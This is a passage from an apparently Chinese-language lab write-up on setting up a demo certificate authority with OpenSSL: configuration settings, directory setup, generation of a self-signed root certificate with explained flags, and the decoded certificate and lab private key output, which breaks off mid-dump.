copy<br><br><br></code></pre></td></tr></table></figure><table><thead><tr><th>设置</th><th>值</th><th>解释</th></tr></thead><tbody><tr><td>dir</td><td>./demoCA</td><td>所有文件存放的根目录</td></tr><tr><td>certs</td><td>$dir/certs</td><td>存储已颁发证书的目录</td></tr><tr><td>crl_dir</td><td>$dir/crl</td><td>存储已颁发CRL的目录</td></tr><tr><td>database</td><td>$dir/index.txt</td><td>数据库索引文件</td></tr><tr><td>unique_subject</td><td>no</td><td>是否允许创建具有相同主题的多个证书</td></tr><tr><td>new_certs_dir</td><td>$dir/newcerts</td><td>存储新创建证书的默认目录</td></tr><tr><td>certificate</td><td>$dir/cacert.pem</td><td>CA证书文件</td></tr><tr><td>serial</td><td>$dir/serial</td><td>当前序列号文件</td></tr><tr><td>crlnumber</td><td>$dir/crlnumber</td><td>当前CRL号码文件</td></tr><tr><td>crl</td><td>$dir/crl.pem</td><td>当前CRL文件</td></tr><tr><td>private_key</td><td>$dir/private/cakey.pem</td><td>私钥文件</td></tr><tr><td>x509_extensions</td><td>usr_cert</td><td>添加到证书的扩展</td></tr><tr><td>name_opt</td><td>ca_default</td><td>主题名称选项</td></tr><tr><td>cert_opt</td><td>ca_default</td><td>证书字段选项</td></tr><tr><td>copy_extensions</td><td>copy</td><td>复制扩展选项（当前被注释掉）</td></tr></tbody></table><p>在家目录下创建工作目录CA，将openssl.cnf复制到此处，删除文件中copy_extensions = copy和unique_subject  = no的注释</p><p>将该文件复制到工作目录之后，需要按照配置文件中指定的方式创建几个子目录。我们需要创建几个子目录<code>mkdir certs crl newcerts</code></p><blockquote><p>对于 index.txt 文件，只需创建一个空文件。对于serial文件，在文件中放置一个字符串格式的数字(例如1000)。一旦设置了配置文件 openssl.cnf，就可以创建和颁发证书。</p></blockquote><p>创建几个必须的文件</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span> mkdir certs crl newcerts<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>ls<br>certs  crl  newcerts<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>echo <span class="hljs-number">1000</span> &gt; serial<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;&#x27;</span> &gt; index.txt<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>ls<br>certs  crl  index.txt  newcerts  serial<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>ls<br>certs  crl  index.txt  newcerts  serial<br><br></code></pre></td></tr></table></figure><p>如前所述，我们需要为 CA 生成一个自签名证书。这意味着这个 CA 是完全可信的，它的证书将充当根证书。可以运行以下命令为 CA 生成自签名证书:</p><p>在命令行中指定主题信息和密码，这样就不会提示您输入任何其他信息。在下面的命令中，我们使用-subj 来设置主题信息，使用-passout pass: dees 来设置 dees 的密码。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">openssl req -x509 -newkey rs<span class="hljs-variable">a:4096</span> -<span class="hljs-built_in">sha256</span> -days <span class="hljs-number">3650</span> \<br>-keyout <span class="hljs-keyword">ca</span>.key -out <span class="hljs-keyword">ca</span>.crt \<br>-subj <span class="hljs-string">&quot;/CN=www.modelCA.com/O=Model CA LTD./C=US&quot;</span> \<br>-passout pas<span class="hljs-variable">s:dees</span> \<br>-config ./my_openssl.<span class="hljs-keyword">cnf</span><br></code></pre></td></tr></table></figure><p>执行该命令后，将生成一个名为 <code>ca.key</code> 的私钥文件和一个名为 <code>ca.crt</code> 的自签名根证书文件，可以将该根证书用于签发其他证书</p><ul><li><code>-x509</code>：指定生成自签名的证书，而无需先生成证书请求（CSR）</li><li><code>-newkey rsa:4096</code>：生成一个新的 RSA 4096 位的密钥对。</li><li><code>-sha256</code>：使用 SHA-256 算法进行证书哈希。</li><li><code>-days 3650</code>：证书的有效期为 3650 天（约为 10 年）。</li><li><code>-keyout ca.key</code>：将生成的私钥保存到 <code>ca.key</code> 文件。</li><li><code>-out ca.crt</code>：将生成的证书保存到 <code>ca.crt</code> 文件。</li><li><code>-subj &quot;/CN=www.modelCA.com/O=Model CA LTD./C=US&quot;</code>：指定证书的主题信息，包括通用名称（Common Name）、组织（Organization）和国家代码（Country Code）。</li><li><code>-passout pass:dees</code>：指定私钥的密码为 “dees”。</li><li>/path/to/your/openssl.cnf 配置文件的路径</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/22/23]seed@VM:~/demoCA$ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 \<br><span class="hljs-meta">&gt;</span><span class="bash"> -keyout ca.key -out ca.crt \</span><br><span class="bash">&gt; -subj <span class="hljs-string">&quot;/CN=www.modelCA.com/O=Model CA LTD./C=US&quot;</span> \</span><br><span class="bash">&gt; -passout pass:dees \</span><br><span class="bash">&gt; -config</span> <br>demoCA/          tmp_openssl.cnf  <br><span class="hljs-meta">&gt;</span><span class="bash"> -config ./tmp_openssl.cnf</span> <br>Generating a RSA private key<br>............................................................++++<br>................++++<br>writing new private key to &#x27;ca.key&#x27;<br>-----<br><br></code></pre></td></tr></table></figure><p>我们可以使用以下命令查看 X509证书的解码内容和 RSA 密钥(- text 意味着将内容解码为纯文本;-noout 意味着不打印编码版本)</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs processing">openssl x509 -in ca.crt -<span class="hljs-built_in">text</span> -noout<br>openssl rsa -in ca.<span class="hljs-built_in">key</span> -<span class="hljs-built_in">text</span> -noout<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/21/23]seed@VM:~/.../demoCA$ openssl x509 -in ca.crt -text -noout<br>Certificate:<br>    Data:<br>        Version: 3 (0x2)<br>        Serial Number:<br>            36:b9:8a:24:a2:ea:a6:49:b8:a0:53:22:31:68:75:f1:0f:31:34:69<br>        Signature Algorithm: sha256WithRSAEncryption<br>        Issuer: CN = www.modelCA.com, O = Model CA LTD., C = US<br>        Validity<br>            Not Before: Jun 22 03:45:53 2023 GMT<br>            Not After : Jun 19 03:45:53 2033 GMT<br>        Subject: CN = www.modelCA.com, O = Model CA LTD., C = US<br>        Subject Public Key Info:<br>            Public Key Algorithm: rsaEncryption<br>                RSA Public-Key: (4096 bit)<br>                Modulus:<br>                    00:eb:fb:ab:8d:c2:3b:65:a7:cd:9a:34:ae:6d:b9:<br>                    01:49:ff:cb:c5:7d:8f:b5:19:34:41:a7:3f:df:44:<br>                    56:25:65:ba:92:af:21:16:4b:1f:71:a3:27:1d:04:<br>                    8a:fc:b0:f3:01:47:e9:26:d2:ab:e7:62:36:ff:82:<br>                    6b:1a:a8:b3:03:1f:2c:97:a0:bc:d1:17:75:eb:b2:<br>                    12:f6:2b:94:a1:30:17:45:ab:40:e1:32:31:20:92:<br>                    27:f9:de:22:bf:32:8f:f0:bf:cb:93:b2:18:a7:75:<br>                    43:85:ca:cf:ff:75:48:79:e1:9a:19:43:e0:75:1a:<br>                    10:50:0b:52:6d:a7:0d:bf:a1:db:60:f9:50:82:78:<br>                    35:23:09:a7:12:ad:6b:78:78:e1:f8:d0:d6:ba:19:<br>                    f2:ee:fd:a5:5a:16:49:41:e6:f8:68:e5:84:6b:54:<br>                    ab:a9:ec:a9:22:2e:87:29:0d:62:51:a4:f6:80:49:<br>                    ca:36:4d:ab:ef:22:83:51:df:d7:5b:9c:14:40:4c:<br>                    75:42:85:92:ae:9a:4f:93:75:47:7b:e1:a7:09:35:<br>                    bb:b7:ea:08:2d:0f:e5:df:0d:23:86:9d:33:ef:f5:<br>                    f5:f4:52:60:4a:16:f0:34:80:bd:66:7a:46:6c:e2:<br>                    c5:10:11:ee:5e:44:14:00:74:ff:1c:57:70:bd:69:<br>                    f6:9f:ff:46:8c:48:4e:ea:5e:2c:33:67:fc:e4:ad:<br>                    c8:57:26:b1:ce:27:ed:4f:72:d3:d0:f7:12:6c:69:<br>                    ff:af:af:76:57:cb:2b:7e:96:88:12:34:8d:5e:f7:<br>                    2e:58:a3:96:4e:d5:98:13:ee:91:0c:12:45:97:a8:<br>                    e8:50:61:2a:c4:b0:ca:29:d5:5c:0c:4f:de:67:99:<br>                    c9:7c:2d:77:84:f4:41:44:61:5e:99:69:21:fe:7e:<br>                    e8:0f:06:2a:24:e7:ed:e4:17:37:40:d1:2f:53:99:<br>                    c3:65:b6:91:a4:3d:86:d9:b3:9c:4b:af:b3:b8:56:<br>                    c4:d8:83:8c:5b:16:c9:c2:89:de:55:8f:4e:6c:eb:<br>                    f2:8e:6d:2e:00:7f:6c:9e:f9:6b:63:cc:58:fe:af:<br>                    6d:33:31:02:8c:5f:6b:d1:1f:2f:f5:79:67:8d:d2:<br>                    20:33:fc:8e:f7:1c:c5:67:49:bc:bd:c7:e3:c6:e3:<br>                    ec:52:0c:75:34:f0:1f:2b:15:14:21:8c:91:87:1a:<br>                    0f:1a:90:f8:16:9b:ed:8e:da:49:ba:33:03:82:6e:<br>                    ff:c1:cd:6d:c0:b5:4b:42:99:e9:e2:4f:fb:e3:55:<br>                    30:6e:0d:6e:7d:9c:cb:94:3e:8e:65:60:76:9a:01:<br>                    24:81:b1:72:61:b3:bc:3e:f2:3b:52:d5:24:29:e3:<br>                    9f:47:1b<br>                Exponent: 65537 (0x10001)<br>        X509v3 extensions:<br>            X509v3 Subject Key Identifier: <br>                AA:E0:4C:38:F1:86:1C:61:27:D8:D4:35:85:21:CB:AF:5F:01:07:71<br>            X509v3 Authority Key Identifier: <br>                keyid:AA:E0:4C:38:F1:86:1C:61:27:D8:D4:35:85:21:CB:AF:5F:01:07:71<br><br>            X509v3 Basic Constraints: <br>                CA:TRUE<br>    Signature Algorithm: sha256WithRSAEncryption<br>         03:c1:de:ef:e1:a4:22:3d:53:5f:5c:9d:ca:4f:80:14:7e:f3:<br>         e4:11:83:57:85:03:13:86:87:e0:20:39:d8:67:5f:c2:56:3c:<br>         a3:b0:4a:86:ab:34:21:df:71:8d:32:93:aa:a4:9e:99:36:64:<br>         ea:d7:13:c7:a4:da:2e:80:31:de:be:ff:64:c4:a0:7a:50:ec:<br>         7d:79:2b:07:ea:33:a0:f8:96:c4:c9:d7:cc:02:53:ac:43:22:<br>         ec:7d:33:eb:0d:86:4d:eb:17:c5:d4:cb:65:23:38:ef:6f:a7:<br>         dd:a2:2f:28:22:b6:2f:a3:56:28:18:69:1b:04:07:0b:06:2a:<br>         58:6c:96:ba:66:d0:0b:b6:8c:58:7b:8d:82:a6:82:fd:9c:ff:<br>         a3:08:1a:50:53:d0:4e:f8:5d:18:8f:af:0c:b7:7f:78:34:e9:<br>         7f:79:4c:8b:62:9d:86:b3:a2:4f:3c:f4:aa:47:b5:72:9d:7c:<br>         14:fc:be:28:97:3e:b7:cb:7e:19:55:8f:ea:d9:53:b1:e5:67:<br>         70:09:a7:51:3e:56:e7:d7:43:98:ae:c5:8f:81:92:e5:46:49:<br>         a9:95:7b:dd:56:5a:f6:97:ed:41:bb:5b:85:9d:56:06:3a:ac:<br>         47:1b:16:c6:c3:fc:5d:c5:b4:ef:74:bf:68:90:17:11:34:07:<br>         6d:f8:d8:63:f1:7e:3e:63:03:4d:59:86:5a:3b:32:1b:aa:58:<br>         df:9d:ee:81:3b:a0:d0:2b:d5:6b:65:0e:05:26:e8:4b:a8:c5:<br>         f8:57:64:d7:36:5c:20:43:aa:21:1d:f1:2e:cb:e8:d1:f4:8a:<br>         2c:51:53:1f:3e:3e:29:ca:bc:f7:dd:cd:86:ff:72:93:73:22:<br>         e9:48:7e:ca:00:92:85:20:e4:e3:06:3d:cb:42:b4:eb:be:85:<br>         80:d9:d0:ec:59:6c:1e:c7:0a:d0:00:a5:71:07:5e:e7:c6:9b:<br>         48:42:af:0d:21:bb:1e:87:50:89:ba:5f:cc:3b:a5:59:f1:49:<br>         ec:64:85:ce:42:f9:1a:f4:52:ff:e9:92:83:64:24:c7:57:4a:<br>         85:bc:b9:71:1d:4a:9b:3c:c9:b9:29:01:3f:eb:4c:9f:c1:4b:<br>         d7:8b:da:a1:1b:ba:80:dd:19:62:1b:fb:4f:6d:4f:2a:20:ff:<br>         ee:f6:11:4d:11:c1:1b:3f:af:82:d3:19:93:82:d8:c6:5c:9c:<br>         d3:38:58:5a:3f:4d:8d:c5:23:3c:87:fc:bc:b0:86:8c:d5:5f:<br>         ed:3d:be:26:22:b7:a9:6e:e5:d8:00:49:7c:35:5d:1d:96:b2:<br>         7e:59:bd:61:17:24:ff:fa:3c:f5:78:bd:1f:a0:7f:b5:4a:02:<br>         2c:d8:44:37:4c:6d:4b:b0<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/21/23]seed@VM:~/.../demoCA$ openssl rsa -in ca.key -text -noout<br>Enter pass phrase for ca.key:<br>RSA Private-Key: (4096 bit, 2 primes)<br>modulus:<br>    00:eb:fb:ab:8d:c2:3b:65:a7:cd:9a:34:ae:6d:b9:<br>    01:49:ff:cb:c5:7d:8f:b5:19:34:41:a7:3f:df:44:<br>    56:25:65:ba:92:af:21:16:4b:1f:71:a3:27:1d:04:<br>    8a:fc:b0:f3:01:47:e9:26:d2:ab:e7:62:36:ff:82:<br>    6b:1a:a8:b3:03:1f:2c:97:a0:bc:d1:17:75:eb:b2:<br>    12:f6:2b:94:a1:30:17:45:ab:40:e1:32:31:20:92:<br>    27:f9:de:22:bf:32:8f:f0:bf:cb:93:b2:18:a7:75:<br>    43:85:ca:cf:ff:75:48:79:e1:9a:19:43:e0:75:1a:<br>    10:50:0b:52:6d:a7:0d:bf:a1:db:60:f9:50:82:78:<br>    35:23:09:a7:12:ad:6b:78:78:e1:f8:d0:d6:ba:19:<br>    f2:ee:fd:a5:5a:16:49:41:e6:f8:68:e5:84:6b:54:<br>    ab:a9:ec:a9:22:2e:87:29:0d:62:51:a4:f6:80:49:<br>    ca:36:4d:ab:ef:22:83:51:df:d7:5b:9c:14:40:4c:<br>    75:42:85:92:ae:9a:4f:93:75:47:7b:e1:a7:09:35:<br>    bb:b7:ea:08:2d:0f:e5:df:0d:23:86:9d:33:ef:f5:<br>    f5:f4:52:60:4a:16:f0:34:80:bd:66:7a:46:6c:e2:<br>    c5:10:11:ee:5e:44:14:00:74:ff:1c:57:70:bd:69:<br>    f6:9f:ff:46:8c:48:4e:ea:5e:2c:33:67:fc:e4:ad:<br>    c8:57:26:b1:ce:27:ed:4f:72:d3:d0:f7:12:6c:69:<br>    ff:af:af:76:57:cb:2b:7e:96:88:12:34:8d:5e:f7:<br>    2e:58:a3:96:4e:d5:98:13:ee:91:0c:12:45:97:a8:<br>    e8:50:61:2a:c4:b0:ca:29:d5:5c:0c:4f:de:67:99:<br>    c9:7c:2d:77:84:f4:41:44:61:5e:99:69:21:fe:7e:<br>    e8:0f:06:2a:24:e7:ed:e4:17:37:40:d1:2f:53:99:<br>    c3:65:b6:91:a4:3d:86:d9:b3:9c:4b:af:b3:b8:56:<br>    c4:d8:83:8c:5b:16:c9:c2:89:de:55:8f:4e:6c:eb:<br>    f2:8e:6d:2e:00:7f:6c:9e:f9:6b:63:cc:58:fe:af:<br>    6d:33:31:02:8c:5f:6b:d1:1f:2f:f5:79:67:8d:d2:<br>    20:33:fc:8e:f7:1c:c5:67:49:bc:bd:c7:e3:c6:e3:<br>    ec:52:0c:75:34:f0:1f:2b:15:14:21:8c:91:87:1a:<br>    0f:1a:90:f8:16:9b:ed:8e:da:49:ba:33:03:82:6e:<br>    ff:c1:cd:6d:c0:b5:4b:42:99:e9:e2:4f:fb:e3:55:<br>    30:6e:0d:6e:7d:9c:cb:94:3e:8e:65:60:76:9a:01:<br>    24:81:b1:72:61:b3:bc:3e:f2:3b:52:d5:24:29:e3:<br>    9f:47:1b<br>publicExponent: 65537 (0x10001)<br>privateExponent:<br>    5d:f2:8c:c2:db:ff:df:a1:a5:85:ed:d1:3f:97:76:<br>    be:ea:1a:4a:de:89:16:d5:18:eb:c6:54:f4:62:f5:<br>    54:e0:22:1e:01:a0:cf:8a:4a:d3:67:db:cb:7e:a2:<br>    82:a5:43:a9:4f:e2:af:75:11:c1:05:65:d5:e5:2b:<br>    14:aa:f2:d1:9c:58:99:69:01:a2:d0:8f:3e:ad:5f:<br>    45:27:e6:7d:21:73:32:66:52:67:15:1f:5f:d3:30:<br>    1d:16:e5:88:6e:ed:c5:2f:e6:31:3f:a6:f7:0c:05:<br>    3c:bf:98:7d:20:49:21:54:c2:8f:aa:69:32:d5:94:<br>    86:f9:6a:f0:82:a0:43:99:81:88:22:d9:7d:87:b3:<br>    c7:e6:30:e0:8b:b0:0c:7f:3b:9f:5e:2d:0e:5c:04:<br>    4e:47:26:cc:2d:b1:2e:8e:70:78:fa:5e:f4:87:f9:<br>    eb:a5:6f:54:4f:67:b9:dd:3d:36:39:d1:75:13:6b:<br>    70:a1:0d:81:1f:a1:5e:38:1a:39:bb:72:88:82:a7:<br>    f0:3a:d3:41:b5:e7:56:52:4b:8a:33:34:d7:c2:cf:<br>    a0:11:88:fd:bf:a5:89:5e:66:b5:51:e2:7a:76:d6:<br>    5b:55:6c:46:32:c9:a0:6d:5c:79:ee:d6:18:c5:53:<br>    24:e9:ae:97:52:cd:0f:bd:84:4e:d9:34:e6:03:c8:<br>    8d:f8:31:0c:52:b8:38:73:f3:62:74:e2:38:72:cb:<br>    fe:00:7a:47:8e:a0:6a:8e:1a:57:1d:d6:40:2b:54:<br>    2f:e8:d3:2d:be:d0:e4:3e:f4:ed:c8:2a:df:af:b7:<br>    a0:47:75:fe:8d:19:13:4f:30:d9:23:d1:86:9a:9f:<br>    d5:db:45:43:9f:fb:fa:c6:f3:2b:44:02:98:f6:e8:<br>    a8:12:af:c1:c0:9d:24:53:72:c6:29:ac:b0:4f:9c:<br>    a6:37:2e:9f:5d:f9:d9:1a:6c:7b:b6:b0:13:35:63:<br>    a7:f0:d3:ac:be:da:ab:c6:19:49:d5:eb:c3:6c:42:<br>    f8:5e:46:96:a7:7e:6f:33:2f:c4:60:20:f2:18:c4:<br>    cc:c6:24:da:bc:6c:19:1c:c7:bf:07:e9:b0:8a:44:<br>    a0:4d:6b:3d:42:84:b6:b6:3b:bc:16:24:0c:79:e8:<br>    0c:0b:77:29:7f:90:0c:e1:e6:2d:a6:d1:3a:41:8e:<br>    f6:f2:b9:74:91:aa:ea:fc:d2:45:2e:ed:46:21:8c:<br>    1c:3b:22:73:75:c7:d1:b6:f1:9f:0d:80:c0:30:af:<br>    58:4d:4d:43:38:5c:36:ff:ba:0a:bc:70:be:12:66:<br>    81:09:68:b2:53:92:f6:3f:1c:25:19:2b:b9:f5:e2:<br>    0e:a8:54:d3:90:73:50:52:6c:d0:96:f3:ce:30:7a:<br>    dd:19<br>prime1:<br>    00:ff:1d:5f:ca:d9:83:4a:b1:26:b2:82:69:0d:77:<br>    2c:c1:ed:99:84:40:22:f0:63:33:e0:ff:94:7f:c0:<br>    2c:aa:41:2f:a9:b7:25:df:06:e2:1d:30:f1:c1:8c:<br>    02:12:0d:38:61:94:f3:de:c8:20:56:0f:a9:ea:61:<br>    82:9b:06:25:8c:38:33:e1:fa:e0:b9:54:76:12:2d:<br>    27:c5:6b:8c:29:c9:ee:06:ed:1f:6b:d0:8a:b2:56:<br>    3f:27:ec:13:bf:58:c7:2c:57:80:56:d7:9c:e2:a2:<br>    e1:e9:73:1b:3e:95:e0:35:7f:c5:4a:20:e7:53:59:<br>    49:b9:85:fe:9e:05:fa:89:f0:5d:35:5a:d1:c3:5a:<br>    1d:d9:6b:a5:3b:2f:11:0b:4b:71:42:6c:7e:df:8b:<br>    4c:d1:38:37:87:b4:99:88:7b:e2:3c:c5:18:f1:7d:<br>    6c:01:b7:9f:39:ab:b0:14:93:fe:4a:d2:a1:37:f5:<br>    11:f4:a7:68:24:a6:1e:96:b6:ed:5d:85:1f:bc:df:<br>    eb:11:a3:1a:8b:98:a9:dc:4a:ab:19:a1:4f:12:02:<br>    cc:35:58:92:ca:5b:e3:e9:f3:7d:cf:25:ac:7a:cb:<br>    ab:46:32:4d:e6:75:01:03:5f:63:cb:1f:96:2d:4e:<br>    ad:a7:48:52:03:4d:83:80:b2:84:58:30:df:bd:59:<br>    22:0d<br>prime2:<br>    00:ec:cd:4c:fd:33:fc:4f:e4:c2:13:df:0a:79:eb:<br>    4a:a1:70:9e:52:c4:bd:74:4f:d9:8d:ff:f2:20:62:<br>    dc:86:09:2f:37:01:39:54:8f:84:02:bf:f3:01:e4:<br>    b4:8e:14:3d:1c:5d:f0:7b:48:11:a1:b6:54:ec:7d:<br>    98:79:a6:23:7b:6d:9e:c0:fa:10:cc:cf:2f:89:11:<br>    08:16:37:c9:7e:8b:1b:d4:71:3e:ae:ba:1d:76:46:<br>    6b:72:25:b5:6e:8c:63:b5:00:5d:6f:8f:c0:00:a8:<br>    76:ce:40:5c:53:ca:2e:ac:c6:9a:84:cc:72:9a:96:<br>    3e:27:3c:cc:3f:41:c2:13:bd:6c:f2:37:cb:c4:e3:<br>    8b:3a:03:a2:bb:ab:e4:8f:53:0f:1a:b3:2a:16:2e:<br>    b3:7f:de:a2:9d:0a:93:77:8e:6c:90:97:cb:7c:9e:<br>    71:e0:4c:56:f7:ae:24:f6:8c:a5:7f:41:96:5c:cd:<br>    4c:c5:dc:8b:54:46:30:10:61:85:5f:e5:a0:7d:78:<br>    fd:fe:90:9a:ec:b1:3f:8c:37:1a:a5:7d:07:75:fe:<br>    41:30:0f:ea:44:db:24:ea:7d:51:f1:c4:1b:40:46:<br>    18:3a:ed:c5:e1:1f:ea:4f:70:f0:84:7c:24:3d:5e:<br>    f6:72:27:ab:10:fb:63:03:1e:e8:55:ad:fa:44:cc:<br>    4b:c7<br>exponent1:<br>    00:ec:dd:a8:20:5e:7e:91:6e:13:e0:f0:46:7b:d3:<br>    28:02:53:0a:13:89:bd:26:f6:e4:a7:46:85:e9:6b:<br>    53:cd:2c:43:05:cf:df:e0:c8:b2:4e:aa:2f:fd:25:<br>    72:92:b2:25:a4:2c:b9:95:22:b9:2b:4e:d5:d3:a1:<br>    7f:b3:52:2c:b0:99:4a:4a:ca:35:b6:bd:9d:f6:d8:<br>    68:31:db:de:42:ba:93:3f:69:10:a0:78:fb:1e:04:<br>    08:15:98:12:e9:b9:93:0c:2f:9e:20:83:86:cd:c2:<br>    b0:00:a1:f8:2c:ce:d9:62:b2:e4:4a:24:6c:c3:ad:<br>    